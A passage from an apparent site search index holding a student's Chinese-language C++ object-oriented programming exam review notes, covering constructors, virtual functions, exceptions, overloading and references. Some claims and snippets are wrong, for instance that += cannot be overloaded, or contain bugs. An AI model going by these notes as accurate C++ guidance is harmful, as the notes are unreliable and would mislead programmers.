\u4e8c\u53c9\u6811\u7684\u6027\u8d28</p>"},{"location":"ZJU-course/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"oop \u671f\u672b\u590d\u4e60","text":""},{"location":"ZJU-course/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_1","title":"\u9519\u9898","text":"<p>oop\u671f\u672b\u8865\u5929</p> <p>\u8bb0\u5f55\u4e86oop\u671f\u672b\u590d\u4e60\u7684\u65f6\u5019\u9047\u5230\u7684\u4e00\u7cfb\u5217\u95ee\u9898\uff0c\u53ef\u80fd\u5b58\u5728\u4e00\u4e9b\u7684\u9519\u8bef\u8bf7\u8c28\u614e\u9605\u8bfb\u3002\u4e3b\u5e72\u7684C++\u77e5\u8bc6\u8bf7\u53c2\u7167\u6280\u672f\u79ef\u7d2f\u4e2d\u7684C++note.</p> <ul> <li>If you are not interested in the contents of an exception object, the catch block parameter may be omitted.\uff08T\uff09   \u5982\u679c\u60a8\u5bf9\u5f02\u5e38\u5bf9\u8c61\u7684\u5185\u5bb9\u4e0d\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u7701\u7565catch block\u53c2\u6570\u3002</li> <li>Manipulators are objects to be inserted or extracted into/from streams \uff08T)</li> <li>\u200b\u200b</li> <li>const member has to be initialized and can not be modified</li> <li>\u5148\u53bb\u5bfb\u627e\u5bf9\u5e94\u7684\u51fd\u6570\uff0c\u518d\u627e\u53ef\u4ee5\u7c7b\u578b\u8f6c\u6362\u7684\uff0c\u518d\u627e\u6a21\u677f</li> <li><code>cpp   int main()   {       char ch[10]=\"hi\";       char *p=ch;       int x=100;       int *p1=&amp;x;       cout&lt;&lt;p1&lt;&lt;endl;   //\u8f93\u51fap1\u6240\u4ee3\u8868\u7684\u5730\u5740       cout&lt;&lt;p&lt;&lt;endl;    //\u8f93\u51fahi   }</code></li> <li>explicit\u5173\u952e\u8bcd\uff0c\u5f53\u671f\u4f5c\u7528\u4e8e\u6784\u9020\u51fd\u6570\u7684\u65f6\u5019\uff0c\u8bf4\u660e\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u4e0d\u5141\u8bb8\u88ab\u9690\u5f0f\u8c03\u7528   \u5728C++\u7684\u521d\u59cb\u5316\u72b6\u6001\u4e0b\uff0cC y=1 \u7b49\u540c\u4e8e C y(1) \u4f46\u662f\u8fd9\u79cd\u505a\u6cd5\u88ab\u89c6\u4f5c\u662f\u9690\u5f0f\u8c03\u7528\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7b2c\u4e8c\u4e2a\u6784\u9020\u51fd\u6570\u7684\u8bdd\uff0c\u7b2c\u4e8c\u6761\u8bed\u53e5\u5c31\u4f1a\u62a5\u9519</li> </ul> <pre><code>class C{\npublic:\n    explicit C(int i){cout&lt;&lt;\"A\"&lt;&lt;endl;}\n    C(double i){cout&lt;&lt;\"B\"&lt;&lt;endl;}\n};\nint main(){\n  C x(1);   \u8f93\u51faA\n    C y=1;    \u8f93\u51faB\n}\n</code></pre> <ul> <li>const \u7684\u91cd\u8f7d</li> </ul> <p>\u5148\u53bb\u627e\u662f\u5426\u5b8c\u5168\u7b26\u5408\u7684\uff0c\u518d\u627e\u6709\u65e0\u6a21\u677f\uff0c\u518d\u627e\u7c7b\u578b\u8f6c\u6362\uff0c</p> <p><pre><code>template&lt;class T&gt;\nvoid f(T&amp; t){cout&lt;&lt;\"1\"&lt;&lt;endl;}\n//template&lt;&gt;   \u8fd9\u4e2a\u8868\u793a\u4e00\u79cd\u7279\u5316\uff0c\u5bf9\u4e8e\u4e0a\u8ff0\u8fd9\u4e2a\u6a21\u677f\u6765\u8bf4\uff0c\u7279\u5316\u4e86\u5176\u4e2d\u4e00\u79cd\u51fd\u6570\u5f62\u5f0f\uff0c\u7279\u522b\u5b9a\u4e49\u4e86\u5f53T\u4e3aconst int\u7684\u60c5\u51b5\nvoid f(const int&amp; i){cout&lt;&lt;\"2\"&lt;&lt;endl;}\nint main(){\n    const int i=0;\n  int k=0;\n  f(i);    //2\n  f(k);    //1\n}\n</code></pre> * static_cast \u7b49 * destructor \u5199\u6210virtual\u662f\u4e3a\u4e86\u8ba9\u5176\u6307\u5411\u5b50\u7c7b\u7684\u65f6\u5019\u4e5f\u80fd\u505a\u6b63\u786e\u5730\u6790\u6784 * \u5bf9\u4e8eoperator = \u5e94\u8be5\u5728\u505a\u5b8c\u8d4b\u503c\u4e4b\u540e\uff0c\u8fd4\u56de*this * \u865a\u51fd\u6570\u8868\u7684\u6307\u5411\u9009\u62e9\uff0c\u5176\u4f1a\u9009\u62e9\u5b8c\u5168\u76f8\u540c\u7684\u5b50\u7c7b\u865a\u51fd\u6570\uff0c\u5982\u679c\u8fd4\u56de\u503c\u4e0d\u540c\u4f1a\u76f4\u63a5\u62a5\u9519\uff0c\u5982\u679c\u53c2\u6570\u8868\u4e0d\u540c\u5c31\u65e0\u6cd5\u8fbe\u6210\u591a\u6001  </p> <pre><code>class A{\npublic:\n    virtual void F(int i){cout&lt;&lt;\"A\"&lt;&lt;endl;}\n};\nclass B:public A{\npublic:\n    virtual void F(double i){cout&lt;&lt;\"B\"&lt;&lt;endl;}\n    virtual void F(int i){cout&lt;&lt;\"C\"&lt;&lt;endl; return 1;}//\u51fd\u6570\u4e09\n};\n\nint main(){\n    A *a=new B();\n    a-&gt;F(1);      \u90fd\u4f1a\u8f93\u51faC\uff0c\u4f46\u5f53\u51fd\u6570\u4e09\u88ab\u6ce8\u91ca\u6389\u7684\u65f6\u5019\uff0c\u5c31\u90fd\u8c03\u7528\u7236\u7c7b\u81ea\u5df1\u7684\u51fd\u6570\n    (*a).F(1);\n}\n</code></pre> <ul> <li>\u5bf9\u8c61\u6570\u7ec4  </li> </ul> <pre><code>A *p=new A[2];\ndelete p;  \u53ea\u4f1a\u8c03\u7528A[0]\u7684\u6790\u6784\u51fd\u6570\n</code></pre> <ul> <li>function prototype(\u51fd\u6570\u539f\u578b\uff0c\u4e5f\u5c31\u662f\u51fd\u6570\u58f0\u660e\u5f0f\u5c55\u793a\u7684\u90a3\u4e9b\u4e1c\u897f\uff09</li> <li>\u5728\u6790\u6784\u51fd\u6570\u6ca1\u6709\u591a\u6001\uff08\u975evirtual\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u5bfc\u81f4delete\u7684\u65f6\u5019\u53ea\u89e6\u53d1\u57fa\u7c7b\u7684\u6790\u6784\u51fd\u6570  </li> </ul> <pre><code>class A\n{\npublic:\n    A() { cout &lt;&lt; \"A( )\" &lt;&lt; endl; }\n    ~A() { cout &lt;&lt; \"~A()\" &lt;&lt; endl; }\n};\nclass B : public A\n{\npublic:\n    B() { cout &lt;&lt; \"B( )\" &lt;&lt; endl; }\n    ~B() { cout &lt;&lt; \"~B()\" &lt;&lt; endl; }\n};\nint main()\n{\n    A *ap = new B[2];\n    delete []ap;\n}\n\u8f93\u51faA( )\nB( )\nA( )\nB( )\n~A()\n~A()\n</code></pre> <ul> <li>\u5f53\u7ee7\u627f\u65f6\u5b50\u7c7b\u7684virtual\u51fd\u6570\u8bbf\u95ee\u5230\u5b50\u7c7b\u624d\u6709\u7684\u6210\u5458\u65f6\uff0c\u7528\u7236\u7c7b\u7684\u6307\u9488\u53bb\u6307\u5411\u5b50\u7c7b\uff0c\u4ecd\u7136\u53ef\u4ee5\u89e6\u53d1\u5b50\u7c7b\u7684\u865a\u51fd\u6570</li> <li>\u53ea\u8981\u6709\u4e00\u4e2a\u7eaf\u865a\u51fd\u6570\uff0c\u5c31\u662fabstract class,\u62bd\u8c61\u7c7b\u4e0d\u80fd\u6784\u9020\u5bf9\u8c61\uff0c\u4f1a\u76f4\u63a5\u62a5\u9519</li> <li>\u200b\u200b</li> <li>\u4e0d\u8bba\u4e00\u4e2a\u865a\u51fd\u6570\u662f\u5426\u4e3a\u7eaf\u865a\u51fd\u6570\uff0c\u5176\u865a\u51fd\u6570\u8868\u90fd\u4f1a\u5b58\u5728\uff0c\u865a\u51fd\u6570\u8868\u7684\u5927\u5c0f\u4e3a\u4e00\u4e2a\u6307\u9488\u5927\u5c0f\uff0c\u4f46\u662f\u5728\u8ba1\u7b97\u7c7b\u7684\u5927\u5c0f\u7684\u65f6\u5019\u8981\u6ce8\u610f\u5185\u5b58\u5bf9\u9f50\u89c4\u5219  </li> </ul> <p><pre><code>class A{\npublic:\n    int x;\n    virtual void func()=0;\n};\n\n\u4e00\u822c\u6765\u8bf4\u8bbe int \u662f 4\uff0c\u6307\u9488\u5927\u5c0f \u4e3a 8\nsizeof(int) \u7684\u7ed3\u679c\u662f16\n</code></pre> * 4. Which of the following sentences is not correct                       (~ A ~)D</p> <p>a. Derived class object can be assigned to Base class object.</p> <p>b. Base class object can be assigned to Derived class object.</p> <p>c. Derived class object point can be assigned to Base class object point.</p> <p>d. Base class object point can be assigned to Derived class object point. * delete p, \u53ef\u80fd\u4f1a\u53d1\u751f\u91cd\u8f7d\uff0c\u4e5f\u53ef\u80fd\u4e0d\u53d1\u751f * <code>cpp   int a=10;       int b=20;       int &amp; k=a;       k=30;       k=b;       k=40;       cout&lt;&lt;a&lt;&lt;endl;  \u8f93\u51fa40\uff0c\u5bf9\u7c7b\u4e5f\u662f\u5982\u6b64</code> * \u4e0a\u8ff0\u4ee3\u7801,k=b\u770b\u4f3c\u662f\u8ba9k\u6307\u5411b\uff0c\u5176\u5b9e\u53ea\u662f\u628ab\u8d4b\u503c\u7ed9k\uff0c\u4e5f\u5c31\u662fa\uff0ck\u4e00\u76f4\u6307\u5411a * \u591a\u91cd\u7ee7\u627f  </p> <p><pre><code>class A: public B,public C{}\n</code></pre> * \u63a5\u53e3\u7c7b  \u662fabstract class \u5168\u662f\u7eaf\u865a\u51fd\u6570\uff0c\u9664\u4e86\u6790\u6784\u51fd\u6570\u662f\u7a7a\u7684\u865a\u51fd\u6570\uff0c\u6ca1\u6709static\u548c\u7ee7\u627f * \u865a\u7ee7\u627f\uff0c\u65e0\u9700\u8003\u8651\u83f1\u5f62\u7ee7\u627f\u7684\u8def\u5f84\u95ee\u9898\uff1f</p> <pre><code>class B:virtual public A{}\n</code></pre>"},{"location":"ZJU-course/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_2","title":"\u7a0b\u5e8f\u586b\u7a7a","text":"<pre><code>class String{\nprivate:\n    char *m_ptr;\npublic:\n    String(char *a){\n        m_ptr=new char[strlen(m_ptr)+1];\n        strcpy(m_ptr,a);\n    }\n    ~String(){\n        delete [] m_ptr;\n    }\n\n};\n</code></pre>"},{"location":"ZJU-course/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_3","title":"\u7f16\u7a0b\u9898","text":"<ul> <li>\u5199\u4e00\u4e2a\u5faa\u73af\u961f\u5217\u6a21\u677f\uff0c\u7528\u6570\u7ec4\u53bb\u6a21\u62df\uff0c\u53c2\u89c1\u6211\u7684proj1</li> </ul>"},{"location":"ZJU-course/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/oop%20%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_4","title":"\u4e00\u4e9b\u5bb9\u6613\u5fd8\u8bb0\u7684\u4e1c\u897f","text":"<ul> <li><code>cpp   #ifndef   #define   #endif</code></li> </ul> <p>\u200d</p> <ul> <li> <p><code>cpp   class A{     A(){cout&lt;&lt;\"A\"&lt;&lt;endl;}     A(int i){cout&lt;&lt;\"Aint\"&lt;&lt;endl;}     A(const A&amp; a){cout&lt;&lt;\"ctor\"&lt;&lt;endl;}     A&amp; operator=(const A&amp; a){A c; cout&lt;&lt;\"=\"&lt;&lt;endl;  return c;)   }   int main(){     A a;     A b=a;   \u8fd8\u662f\u4f1a\u8c03\u7528\u62f7\u8d1d\u6784\u9020     A c(a);     A d;     d=a;     A j=1;   \u7b49\u540c\u4e8ej(1)   }</code></p> </li> <li> <p>\u683c\u5f0f\u5316\u8f93\u5165\u8f93\u51fa</p> </li> <li>new double[100] () \u548c new double[100] {}\u4f1a\u5c06\u52a8\u6001\u5206\u914d\u7684\u6570\u7ec4\u521d\u59cb\u5316\u4e3a0\uff0c\u5982\u679c\u4e0d\u52a0\u7684\u4f1a\u53ef\u80fd\u4f1a\u6709\u968f\u673a\u503c</li> <li>\u53e6\u5916\u51fd\u6570\u6a21\u677f\u548c\u666e\u901a\u51fd\u6570\u533a\u522b\u7ed3\u8bba\uff1a 1.\u4e24\u8005\u5141\u8bb8\u5e76\u5b58 2.\u51fd\u6570\u6a21\u677f\u4e0d\u5141\u8bb8\u81ea\u52a8\u7c7b\u578b\u8f6c\u5316 3.\u666e\u901a\u51fd\u6570\u80fd\u591f\u8fdb\u884c\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362.</li> <li>\u865a\u51fd\u6570\u7684\u53c2\u6570\u8868\u5fc5\u987b\u5b8c\u5168\u76f8\u540c\uff0c\u624d\u80fd\u6784\u6210\u591a\u6001\uff0c\u8fd4\u56de\u503c\u4e5f\u9700\u76f8\u540c\uff0c\u5982\u679c\u53c2\u6570\u8868\u76f8\u540c\u8fd4\u56de\u503c\u4e0d\u540c\u4f1a\u62a5\u9519</li> <li>const\u7684\u5bf9\u8c61\u4e0d\u80fd\u4f20\u7ed9\u975econst\u7684\u6307\u9488\u548c\u5f15\u7528\uff0c\u4f46\u662f\u975econst\u7684\u5bf9\u8c61\u53ef\u4ee5\u4f20\u7ed9const\u7684\u6307\u9488\u548c\u5f15\u7528</li> <li>A&amp; operator=(const A&amp; x)  \u6ce8\u610f\u8fd4\u56de\u503c\u662fA&amp;</li> <li>\u5982\u4f55new\u4e00\u4e32\u6709\u53c2\u6784\u9020\u51fd\u6570\u7684\u5bf9\u8c61</li> <li>\u7a7a\u95f4\u5206\u914d\u95ee\u9898   static \u7684\u4e1c\u897f \u653e\u5728global data space</li> <li>arbitary \u4efb\u610f\u7684  derived \u6d3e\u751f\u7684</li> <li>\u62f7\u8d1d\u7684\u65f6\u5019  </li> </ul> <pre><code>void func(char *a){\n  char* x=new char[strlen(a)+1];\n  strcpy(x,a);\n</code></pre> <ul> <li>namespace \u540e\u9762\u4e0d\u7528\u5206\u53f7</li> <li> <p><code>cpp   namespace aaa{     void func(){}   }   int main(){     using namespace aaa;     using aaa::func();     using a = aaa;     a::func();   }</code></p> </li> <li> <p>\u5982\u679c\u6ca1\u5b9a\u4e49=\u548c\u62f7\u8d1d\u6784\u9020\uff0c\u4f1a\u53bb\u8c03\u7528\u5185\u90e8\u6210\u5458\u7684\u62f7\u8d1d\u6784\u9020\u548c=</p> </li> <li>visibility and accessibility   overload and overriding   static and dynamic polymoriphism</li> <li>\u4e0d\u80fd\u7528\u53cb\u5143\u91cd\u8f7d\u7684= () [] -&gt;\uff0c\u548c\u4e0d\u80fd\u7528\u6240\u6709\u65b9\u5f0f\u91cd\u8f7d\u7684</li> <li>cv-qualifier list   const volatile</li> <li>try\u8bed\u53e5\u91cc\u7684\u4e1c\u897f\u4ec0\u4e48\u65f6\u5019\u6790\u6784\uff0c\u89e6\u53d1catch\u7684\u65f6\u5019\u6790\u6784   catch\u53ef\u4ee5\u53d1\u751fupcast\uff0c\u4f46\u662f\u65e0\u6cd5\u89e6\u53d1\u9690\u85cf\u5f0f\u7c7b\u578b\u8f6c\u6362   \u5f53\u53d1\u751fthrow\u7684\u65f6\u5019\uff0c\u9700\u8981\u5411\u4e0a\u629b\u76f4\u5230\u627e\u5230catch\u65f6\uff0c\u53d1\u751f\u4e00\u6b21catch\u4e4b\u540e\uff0c\u540e\u7eed\u7684catch\u90fd\u4e0d\u88ab\u6267\u884c\uff0c\u8be5try\u5757\u91cc\u9762\uff0c\u53ef\u89c6\u4f5c\u5168\u5c55\u5f00\u7684\u4ee3\u7801\u5757\uff0cthrow\u540e\u7684\u4e1c\u897f\u4e0d\u6267\u884c\uff0c\u540e\u9762\u5168\u90e8\u7684\u987a\u5e8f\u6267\u884c   \u5982\u679cthrow\u7684\u4e1c\u897f\u5230\u6700\u540e\u4e5f\u65e0\u6cd5\u88ab\u63a5\u53d7\uff0c\u7a0b\u5e8f\u4f1a\u5728\u6b64\u7ec8\u6b62\uff0c\u5e76\u7ed9\u51fa\u62a5\u9519\u4fe1\u606f</li> </ul> <p>try \u5185\u90e8\u8bed\u53e5\u987a\u5e8f\u6267\u884c\uff0c\u5f53\u9047\u5230throw\u65f6\u7ec8\u6b62\uff0c\u5f00\u59cb\u5bfb\u627e\u5408\u9002\u7684catch   \u8df3\u5230\u53ef\u4ee5catch\u7684\u90a3\u4e2atry\u91cc\u9762\uff0c\u90a3\u4e2atry\u91cc\u9762throw\u540e\u9762\u7684\u4e1c\u897f\u5168\u90e8\u4e0d\u6267\u884c\uff0c\u7a0b\u5e8f\u8df3\u5230catch\u5185\u90e8\uff0c\u5904\u7406\u7ed3\u675f\u540e\u8fd9\u6bb5try-catch\u8bed\u53e5\u88ab\u89c6\u4e3a\u6b63\u5e38\u7684\u8bed\u53e5\u6267\u884c\u7ed3\u675f\uff0c\u5f00\u59cb\u6267\u884c\u540e\u9762\u7684\u8bed\u53e5 * try\u5185\u90e8\u53d1\u751fthrow\u5e76\u627e\u5230\u5bf9\u5e94\u7684catch\u65f6\uff0c\u5176\u5185\u90e8\u5bf9\u8c61\u5168\u90e8\u88ab\u6790\u6784\uff0c\u5148catch\uff0c\u518d\u6790\u6784   \u4f46\u5176throw\u7684\u90a3\u90e8\u5206\u5bf9\u8c61\u751f\u547d\u5468\u671f\u4f1a\u88ab\u5e26\u5230catch\u5185\u90e8\uff0c\u5e76\u5728catch\u7ed3\u675f\u540e\u88ab\u6790\u6784\uff0c\u4e0d\u8bbacatch\u7684\u662f... \u5f15\u7528\uff0c\u8fd8\u662f\u5355\u7eaf\u7684\u51fd\u6570\u4f20\u503c(\u4f1a\u89e6\u53d1\u62f7\u8d1d\u6784\u9020\uff0c\u6700\u540e\u4f1a\u591a\u6790\u6784\u4e00\u4e2a) * ```cpp   void funcA(){       throw 1;       cout&lt;&lt;\"hello funcA\"&lt;&lt;endl;   }   void funcB(){       try{           funcA();           cout&lt;&lt;\"hello funcB\"&lt;&lt;endl;       }catch(int i){           cout&lt;&lt;\"funcB catch\"&lt;&lt;endl;       }       cout&lt;&lt;\"end of funcB\"&lt;&lt;endl;   }</p> <p>int main()   {       try{           funcB();           cout&lt;&lt;\"hello\"&lt;&lt;endl;       }catch(int i){           cout&lt;&lt;\"main catch\"&lt;&lt;endl;       }       cout&lt;&lt;\"end of main\"&lt;&lt;endl;   }   ```</p> <ul> <li>\u53c2\u6570\u662f\u9759\u6001\u7ed1\u5b9a\u7684\uff0c\u51fd\u6570\u5185\u5bb9\u662f\u52a8\u6001\u7ed1\u5b9a\u7684</li> <li>\u7236\u7c7b\u6307\u9488\u672c\u8eab\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u6709\u7684\u4e1c\u897f\uff0c\u5373\u4fbf\u5176\u6307\u5411\u5b50\u7c7b\u5bf9\u8c61\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5b50\u7c7b\u7684\u6210\u5458   \u4f46\u5f53\u7236\u7c7b\u5229\u7528\u591a\u6001\u8bbf\u95ee\u5b50\u7c7b\u7684\u51fd\u6570\u65f6\uff0c\u5c31\u76f4\u63a5\u8003\u8651\u5b50\u7c7b\u672c\u8eab\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u9664\u4e86\u9ed8\u8ba4\u53c2\u6570\u6709\u4e00\u5b9atrick\u4ee5\u5916   \u6709\u540c\u540d\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u7236\u7c7b\u6307\u9488\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u53d8\u91cf\uff0c\u7236\u7c7b\u8c03\u7528\u5b50\u7c7b\u7684\u51fd\u6570\u65f6\u53ea\u80fd\u8c03\u7528\u5b50\u7c7b\u7684\u53d8\u91cf</li> <li>\u91cd\u8f7d\u8f93\u5165\u8f93\u51fa\u6d41  </li> </ul> <p><pre><code>//the extractor overloading\nostream&amp; operator&lt;&lt;(ostream&amp; s,fraction_num&amp; num){\n    //usually it is used to print the num\n    if(num.nume==0||num.deno==1){\n        s&lt;&lt;num.nume;  \n        return s;\n    }\n    s&lt;&lt;num.nume&lt;&lt;\"/\"&lt;&lt;num.deno;\n    return s;\n}\n//the inserter overloading\nistream&amp; operator&gt;&gt;(istream&amp; s,fraction_num&amp; num){\n    s&gt;&gt;num.nume&gt;&gt;num.deno;\n    num.simplication();\n    return s;\n}\n\n\u5e76\u4e14\u5c06\u5176\u4f5c\u4e3a\u53cb\u5143\u51fd\u6570\n</code></pre> * \u975e\u9759\u6001\u7684\u51fd\u6570\u65f6\u53ef\u4ee5\u8bbf\u95ee\u9759\u6001\u7684\u6210\u5458\u53d8\u91cf\u7684\uff0c\u53cd\u4e4b\u9759\u6001\u7684\u51fd\u6570\u4e0d\u53ef\u8bbf\u95ee\u975e\u9759\u6001\u7684\u6210\u5458\u53d8\u91cf * <code>cpp   typedef int my_int;   using my_int = int;</code></p> <ul> <li>\u91cd\u8f7d\u7c7b\u578b\u8f6c\u6362  </li> </ul> <pre><code>operator double(){\n        return this-&gt;castdouble();\n    };\n</code></pre> <ul> <li>\u591a\u53c2\u6570\u5bf9\u8c61\u6570\u7ec4\u6784\u9020  </li> </ul> <pre><code>class A{\nprivate:\n    int x;\npublic:\n  A(int x,int y):x(x){}\n};\nint main()\n{\n   A a[2] = {{2,3},{4,5}};\n}\n</code></pre> <p>\u200b\u200b</p> <ul> <li>\u6587\u4ef6\u8f93\u5165\u8f93\u51fa\u6d41</li> <li>global variable \u653e\u5728\u5168\u5c40\u53d8\u91cf\u533a   static local/global variable   \u4e5f\u653e\u5728\u5168\u5c40\u53d8\u91cf\u533a\uff0c\u4f46\u4e0d\u5728\u6587\u4ef6\u4e4b\u95f4\u5171\u4eab   local variable   \u5b58\u50a8\u5728\u6808\u533a   allocated variable \u52a8\u6001\u5206\u914d\u7684\u53d8\u91cf  \u653e\u5728\u5806\u533a</li> <li>\u5f15\u7528\u7684\u5bf9\u8c61\u4e0d\u80fd\u662f\u8868\u8fbe\u5f0f</li> <li> <p><code>cpp   char *p=\"hello\"   \u5176\u5b9e\u662f   const char* p = \"hello\"</code></p> </li> <li> <p>\u6784\u9020\u51fd\u6570\u7684\u521d\u59cb\u5316\u987a\u5e8f\u4e0e\u521d\u59cb\u5316\u5217\u8868\u65e0\u5173\uff0c\u4e00\u5b9a\u662f\u6309\u7167\u5148\u7236\u7c7b\uff0c\u518d\u6309\u5b9a\u4e49\u7684\u987a\u5e8f\u6765  </p> </li> </ul> <pre><code>class B:public A{\nprivate:\n    A a2;\n    A a1;\npublic:\n    B():a1(1),A(){}\n};\n\n\u5148\u662f\u7236\u7c7b\u7684A \u518d\u662fa2 \u518d\u662fa1\u65e0\u8bba\u521d\u59cb\u5316\u5217\u8868\u5199\u6210\u4f55\u79cd\u5f62\u5f0f\n</code></pre> <ul> <li>\u51fd\u6570\u91cd\u8f7d\u4f1a\u88ab\u9ed8\u8ba4\u53c2\u6570\u5f71\u54cd</li> <li> <p><code>cpp   void func(int x=10){}   void func(){}   int main()   {       func();   }\u4f1a\u62a5\u9519</code></p> </li> <li> <p><code>cpp   class Integer{   public:     const Integer&amp; operator++();//prefix ++a     const Integer operator++(int);//postfix a++\u8fd9\u91cc\u7684int\u6ca1\u6709\u5b9e\u9645\u610f\u4e49   //\u53ea\u662f\u4e3a\u4e86\u8ba9\u7f16\u8bd1\u5668\u53bb\u533a\u5206\u524d\u7f6e\u548c\u540e\u7f6e\u7684++   //\u56e0\u4e3a\u4e24\u4e2a\u5f0f\u5b50\u90fd\u662f\u4f1a\u6539\u53d8\u4f20\u5165\u5bf9\u8c61\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u6700\u540e\u7684const   private:     int i;   }   //\u5b9e\u9645\u5b9e\u73b0   const Integer&amp; Integer::operator++(){     (*this)+=1;     return *this;   }   const Integer Integer::operator++(int){     Integer old(*this);     ++(*this);     return old;   }   //\u5b9e\u9645\u4f7f\u7528   ++x//x.operator++();   x++//x.operator++(0);</code></p> </li> <li> <p>\u5982\u679c\u6ca1\u6709\u865a\u51fd\u6570\uff0c\u5f53\u57fa\u7c7b\u6307\u9488\u6307\u5411\u5b50\u7c7b\u65f6\uff0c\u8c03\u7528\u51fd\u6570\uff0c\u5176\u4e2d\u4f7f\u7528\u7684\u662f\u5b50\u7c7b\u4e2d\u7684\u7236\u7c7b\u51fd\u6570</p> </li> <li> <p>\u51fd\u6570\u91cd\u8f7d</p> </li> <li> <p>\u5148\u627e\u5b8c\u5168\u5339\u914d\u666e\u901a\u51fd\u6570</p> </li> <li>\u518d\u627e\u5b8c\u5168\u76f8\u540c\u7684\u6a21\u677f\u51fd\u6570</li> <li>\u518d\u627e\u9700\u8981\u9690\u5f0f\u8f6c\u6362\u7684\u51fd\u6570</li> <li>func(1.0) \u8fd9\u4e2a1.0\u662f\u770b\u505afloat\u7684</li> <li>\u4e0d\u80fd\u88ab\u91cd\u8f7d\u7684\u8fd0\u7b97\u7b26</li> <li>simple\u6210\u5458\u51fd\u6570\u662f\u4ec0\u4e48</li> <li>Properties of an object: properties, identity, attributes</li> <li>copy assignment function   operator=   copy construct function     A(const A&amp; a)</li> <li>```cpp   class A{   public:      A(){cout&lt;&lt;\"aa\"&lt;&lt;endl;}      A(int x){cout&lt;&lt;\"hello\"&lt;&lt;endl;}      A&amp; operator=(const A&amp; a){cout&lt;&lt;\"operator = \"&lt;&lt;endl; return *this;}      ~A(){          cout&lt;&lt;\"bb\"&lt;&lt;endl;      }   };</li> </ul> <p>int main()   {       A a;       a=A(1); \u6784\u9020\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf\uff0c\u7136\u540eoperator= \u7136\u540e\u6790\u6784\u4e34\u65f6\u53d8\u91cf   }</p> <p>\u8f93\u51fa   aa   hello   operator =    bb   bb   ```</p> <ul> <li>const\u7684\u6210\u5458\u53d8\u91cf\u4e00\u5b9a\u9700\u8981\u663e\u5f0f\u7684\u521d\u59cb\u5316</li> <li>\u6d3e\u751f\u7c7b\u7684\u53cb\u5143\u51fd\u6570\uff0c\u53ef\u4ee5\u8bbf\u95ee\u57fa\u7c7b\u7684\u975e\u79c1\u6709\u6210\u5458\uff0c\u4f46\u4e0d\u80fd\u8bbf\u95ee\u79c1\u6709\u6210\u5458</li> </ul> <p>\u57fa\u7c7b\u7684\u53cb\u5143\u51fd\u6570\uff0c\u4e0d\u80fd\u8bbf\u95ee\u6d3e\u751f\u7c7b\u7684\u6210\u5458 * 1. \u5355\u7ea7\u7ee7\u627f(single inheritance)\uff1a\u6d3e\u751f\u7c7b\u53ea\u6709\u4e00\u4e2a\u57fa\u7c7b\uff1b\u6d3e\u751f\u7c7b\u5fc5\u987b\u5b9e\u73b0\u6240\u6709\u7684\u62bd\u8c61\u65b9\u6cd5       Single level inheritance supports runtime inheritance       \u5206\u5c42\u7ee7\u627f(hierarchical inheritance)\uff1a\u4e00\u4e2a\u4ee5\u4e0a\u7684\u7c7b\u4ece\u57fa\u7c7b\u7ee7\u627f       \u591a\u7ee7\u627f(multiple inheritance)\uff1a\u6d3e\u751f\u7c7b\u53ef\u4ee5\u6709\u4e24\u4e2a\u6216\u591a\u4e2a\u57fa\u7c7b       \u591a\u7ea7\u7ee7\u627f(multi-level inheritance)\uff1a\u5b50\u5b50\u5b59\u5b59\u65e0\u7a77\u5c3d\u4e5f(bushi)\uff0c\u4f46\u4e00\u4e2a\u7c7b\u53ea\u7ee7\u627f\u81ea\u4e00\u4e2a\u7c7b   2. ||, +=, &amp;&amp; \u4e0d\u80fd\u91cd\u8f7d(+=\u597d\u5947\u602a\uff0c\u4f46\u641c\u51fa\u6765\u8bf4\u4e0d\u80fd) * \u5728\u5199\u6784\u9020\u51fd\u6570\u7684\u65f6\u5019\uff0c\u8bb0\u5f97check\u4f20\u5165\u6570\u636e\u662f\u4e0d\u662fNULL   \u5728\u5199operator=\u7684\u65f6\u5019\uff0c\u8bb0\u5f97check  </p> <pre><code>if(this != &amp;other){\n</code></pre> <ul> <li> <p><code>cpp   p-&gt;func();   (*p).func();   \u6ca1\u6709\u4efb\u4f55\u533a\u522b</code></p> </li> <li> <p>\u63d2\u5165\u548c\u6790\u53d6  Insertion and extraction</p> </li> <li>\u547d\u540d\u7a7a\u95f4\u53ef\u4ee5\u53ea\u58f0\u660e\u51fd\u6570\uff0c\u8ba9\u5b9a\u4e49\u653e\u5728\u5916\u9762</li> <li> <p>typedef int aaa;   using aaa = int;</p> </li> <li> <p>a.\u4e0d\u80fd\u5efa\u7acb\u5f15\u7528\u7684\u5f15\u7528\u3002   b.\u4e0d\u80fd\u5efa\u7acb\u5f15\u7528\u6570\u7ec4\uff0c\u4e5f\u4e0d\u80fd\u5efa\u7acb\u6570\u7ec4\u7684\u5f15\u7528\u3002   c.\u53ef\u4ee5\u5efa\u7acb\u6307\u9488\u7684\u5f15\u7528\uff0c\u4f46\u4e0d\u80fd\u521b\u5efa\u6307\u5411\u5f15\u7528\u7684\u6307\u9488\u3002</p> </li> <li>```cpp   int &amp;p = a;  \u6b63\u786e p\u662fa\u8fd9\u4e2a\u6307\u9488\u7684\u5f15\u7528   int &amp;p = a;  \u9519\u8bef 